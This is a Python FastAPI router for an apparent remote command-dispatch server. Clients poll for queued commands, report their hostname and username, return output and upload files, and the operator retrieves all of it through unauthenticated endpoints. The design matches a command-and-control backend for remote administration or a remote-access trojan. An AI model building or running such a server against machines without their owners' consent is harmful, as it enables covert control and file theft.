from fastapi import APIRouter, File, UploadFile, HTTPException, Depends
from fastapi.responses import FileResponse
from routers.clients import command_queue
from routers.client_registry import update_client_status
from services.command_manager import CommandManager, CommandInfo, ResultType, FileInfo
from services.providers import get_command_manager
from pydantic import BaseModel
from typing import Dict, Optional, List
import os
import shutil
from pathlib import Path

router = APIRouter()

# Create uploads directory if it doesn't exist
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

# 已移至 services.command_manager
import time

class CommandRequest(BaseModel):
    client_id: str
    command: str

class CommandResult(BaseModel):
    command_id: str
    result: str
    status: str  # 'completed', 'failed'
    result_type: ResultType = ResultType.TEXT

# CommandManager 已移至 services.command_manager

@router.get("/next_command")
def get_next_command(client_id: str, hostname: str = None, username: str = None, cmd_manager: CommandManager = Depends(get_command_manager)):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    # 更新客戶端狀態（如果提供了環境資訊）
    if hostname and username:
        stable_id = update_client_status(client_id, hostname, username)
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        print(f"Auto-registered stable ID: {stable_id}")
    
    # 使用 CommandManager 取得下一個 pending 命令
    next_command = cmd_manager.get_next_command(stable_id)
    if next_command:
        command, command_id = next_command
        
        # Update status to executing
        cmd_manager.update_command_status(command_id, 'executing')
        print(f"Sending command to {stable_id}: {command} (ID: {command_id})")
        return {"command": command, "command_id": command_id}
    
    return {"command": None}

@router.post("/send_command")
def send_command(request: CommandRequest, cmd_manager: CommandManager = Depends(get_command_manager)):
    """Send command to client using request body"""
    stable_id = request.client_id
    command = request.command
    
    # 自動註冊 client 到 command_queue
    if stable_id not in command_queue:
        command_queue[stable_id] = None
    
    # 使用 CommandManager 統一處理
    try:
        command_id = cmd_manager.queue_command(stable_id, command)
        command_info = cmd_manager.get_command(command_id)
        timestamp = command_info.timestamp
        
        return {
            "status": f"Command queued for {stable_id}",
            "command_id": command_id,
            "timestamp": timestamp
        }
    except HTTPException:
        raise  # 重新拋出 409 錯誤

@router.post("/submit_result")
def submit_result(result_data: CommandResult, cmd_manager: CommandManager = Depends(get_command_manager)):
    """Submit command execution result"""
    command_id = result_data.command_id
    
    if not cmd_manager.get_command(command_id):
        return {"error": f"Command ID {command_id} not found"}
    
    # 使用 CommandManager 完成 command
    success = cmd_manager.complete_command(
        command_id, 
        result_data.result, 
        result_data.status, 
        result_data.result_type
    )
    
    if not success:
        return {"error": f"Failed to complete command {command_id}"}
    
    print(f"Result received for {command_id}: {result_data.status} ({result_data.result_type})")
    return {"status": "Result submitted successfully", "command_id": command_id}

@router.get("/get_result/{command_id}")
def get_result(command_id: str, cmd_manager: CommandManager = Depends(get_command_manager)):
    """Get command execution result by command ID"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        return {"error": f"Command ID {command_id} not found"}
    
    return command_info

@router.get("/command_history")
def get_command_history(stable_id: str = None, limit: int = 50, cmd_manager: CommandManager = Depends(get_command_manager)):
    """Get command history, optionally filtered by stable_id"""
    history = list(cmd_manager.command_history.values())
    
    if stable_id:
        history = [cmd for cmd in history if cmd.stable_id == stable_id]
    
    # Sort by timestamp (newest first)
    history.sort(key=lambda x: x.timestamp, reverse=True)
    
    return {
        "commands": history[:limit],
        "total": len(history)
    }

@router.post("/upload_files/{command_id}")
async def upload_files(command_id: str, files: List[UploadFile] = File(...), cmd_manager: CommandManager = Depends(get_command_manager)):
    """Upload files for a specific command result"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    # Create command-specific directory
    command_dir = UPLOAD_DIR / command_id
    command_dir.mkdir(exist_ok=True)
    
    uploaded_files = []
    
    for file in files:
        if not file.filename:
            continue
            
        # Security: Clean filename to prevent path traversal
        safe_filename = os.path.basename(file.filename)
        file_path = command_dir / safe_filename
        
        # Save file
        try:
            with open(file_path, "wb") as buffer:
                content = await file.read()
                buffer.write(content)
                
            file_info = FileInfo(
                filename=safe_filename,
                size=len(content),
                content_type=file.content_type or "application/octet-stream",
                upload_timestamp=time.time()
            )
            
            command_info.files.append(file_info)
            uploaded_files.append(file_info)
            
        except Exception as e:
            print(f"Error uploading file {file.filename}: {str(e)}")
            continue
    
    # Update result type based on files
    if command_info.files:
        if command_info.result:
            command_info.result_type = ResultType.MIXED
        else:
            command_info.result_type = ResultType.FILES if len(command_info.files) > 1 else ResultType.FILE
    
    print(f"Uploaded {len(uploaded_files)} files for command {command_id}")
    return {
        "status": "Files uploaded successfully",
        "command_id": command_id,
        "uploaded_files": uploaded_files
    }

@router.get("/download_file/{command_id}/{filename}")
async def download_file(command_id: str, filename: str, cmd_manager: CommandManager = Depends(get_command_manager)):
    """Download a specific file from command results"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    # Check if file exists in command's file list
    file_exists = any(f.filename == filename for f in command_info.files)
    if not file_exists:
        raise HTTPException(status_code=404, detail=f"File {filename} not found for command {command_id}")
    
    file_path = UPLOAD_DIR / command_id / filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {filename} not found on disk")
    
    return FileResponse(
        path=str(file_path),
        filename=filename,
        media_type='application/octet-stream'
    )

@router.get("/list_files/{command_id}")
def list_files(command_id: str, cmd_manager: CommandManager = Depends(get_command_manager)):
    """List all files associated with a command"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    return {
        "command_id": command_id,
        "files": command_info.files,
        "total_files": len(command_info.files)
    }